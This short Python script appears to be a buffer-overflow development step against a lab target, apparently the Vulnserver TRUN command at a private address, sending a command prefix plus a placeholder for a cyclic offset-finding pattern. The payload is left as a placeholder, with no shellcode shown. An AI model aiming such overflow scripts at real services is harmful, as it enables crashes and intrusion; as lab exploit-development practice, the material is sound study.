import socket
s = socket.socket()
s.connect(("10.10.10.4",9999))
leng = 2984
payload = [b"TRUN /.:/",b"<PAYLOAD FROM PATTERNCREATE>"]
payload = b"".join(payload)
s.send(payload)
s.close()
